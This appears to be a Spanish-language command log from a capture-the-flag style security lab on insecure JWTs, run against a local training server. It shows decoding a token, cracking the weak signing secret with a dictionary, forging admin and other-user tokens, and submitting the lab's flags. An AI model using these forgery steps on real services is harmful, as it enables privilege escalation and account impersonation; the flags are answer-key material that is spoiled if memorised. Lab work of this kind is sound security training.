@@ -1,0 +1,24 @@
+# Comandos usados — Lab Extra 5 (JWT inseguro)
+# server: python3 labs/labextra5-jwt/objetivo/server.py   (tool en entregas/.../src/)
+
+# 0. Login (credenciales de demo publicas en la home)
+curl 'localhost:8080/login?user=diego&pass=diego123'
+
+# R1 — el payload viaja en claro (base64url, no cifrado)
+python3 src/jwt_tool.py decodificar <token>
+
+# R2 — crackear el secreto debil (offline) y forjar role=admin
+python3 src/jwt_tool.py crackear <token> labs/labextra5-jwt/caso/diccionario.txt   # -> mate123
+ADM=$(python3 src/jwt_tool.py forjar mate123 --sub diego --role admin)
+curl -H "Authorization: Bearer $ADM" localhost:8080/admin
+
+# R3 — IDOR via JWT: forjar sub=maria
+MAR=$(python3 src/jwt_tool.py forjar mate123 --sub maria --role user)
+curl -H "Authorization: Bearer $MAR" localhost:8080/perfil
+
+# P4 — alg:none: este server lo RECHAZA (recalcula HMAC-SHA256, ignora el header alg)
+
+# Entregar flags
+./ctf submit extra5 R1 'FLAG{jwt_solo_base64}'
+./ctf submit extra5 R2 'FLAG{jwt_forjado_admin}'
+./ctf submit extra5 R3 'FLAG{jwt_suplantacion_idor}'
